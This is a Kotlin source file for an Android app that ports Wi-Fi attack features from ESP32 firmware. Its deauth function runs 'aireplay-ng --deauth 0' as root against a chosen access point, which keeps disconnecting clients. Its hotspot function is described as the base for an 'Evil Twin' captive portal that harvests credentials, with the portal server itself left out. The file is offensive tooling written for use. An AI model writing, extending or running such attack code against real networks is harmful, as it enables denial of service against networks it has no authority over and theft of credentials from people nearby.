package com.halehound

import android.content.Context
import android.net.wifi.*
import android.net.wifi.p2p.WifiP2pManager
import kotlinx.coroutines.*

// WifiAttacks — replaces wifi_attacks.cpp from the original firmware.
// Uses Android WifiManager API instead of the ESP32 raw 802.11 stack.
// NOTE: Raw frame injection (deauth, beacon spam) requires root or a
// USB WiFi adapter with monitor mode (e.g. Alfa AWUS036ACH).
class WifiAttacks(private val context: Context) {

    private val wifiManager = context.applicationContext
        .getSystemService(Context.WIFI_SERVICE) as WifiManager

    // ── Scan nearby APs ───────────────────────────────────────────────────────
    fun scanNetworks(onResults: (List<ScanResult>) -> Unit) {
        wifiManager.startScan()
        // WifiManager.getScanResults() is immediate; trigger again after delay for fresher data
        CoroutineScope(Dispatchers.IO).launch {
            delay(2000)
            val results = wifiManager.scanResults
            withContext(Dispatchers.Main) { onResults(results) }
        }
    }

    // ── Captive portal / Evil Twin ────────────────────────────────────────────
    // Creates a local-only hotspot. Requires Android 8.0+ and CHANGE_WIFI_STATE permission.
    // Full credential-harvesting portal: serve HTTP via NanoHTTPD on port 80 after
    // hotspot is created (see portal_server subpackage — not included in this scaffold).
    fun startLocalHotspot(ssid: String, onStarted: (Boolean) -> Unit) {
        wifiManager.startLocalOnlyHotspot(object : WifiManager.LocalOnlyHotspotCallback() {
            override fun onStarted(reservation: WifiManager.LocalOnlyHotspotReservation) {
                onStarted(true)
            }
            override fun onFailed(reason: Int) {
                onStarted(false)
            }
        }, null)
    }

    // ── Frame injection (root / USB WiFi adapter required) ────────────────────
    // On a rooted device, execute aircrack-ng/aireplay-ng as a subprocess.
    // Non-root path: stub returns an informational message.
    fun deauth(bssid: String, channel: Int, onLog: (String) -> Unit) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                // Attempt via aireplay-ng if available (root required)
                val proc = Runtime.getRuntime().exec(
                    arrayOf("su", "-c",
                        "aireplay-ng --deauth 0 -a $bssid wlan1mon")
                )
                proc.inputStream.bufferedReader().forEachLine {
                    CoroutineScope(Dispatchers.Main).launch { onLog(it) }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) {
                    onLog("Deauth requires root + aireplay-ng OR a USB WiFi adapter in monitor mode. Error: ${e.message}")
                }
            }
        }
    }
}
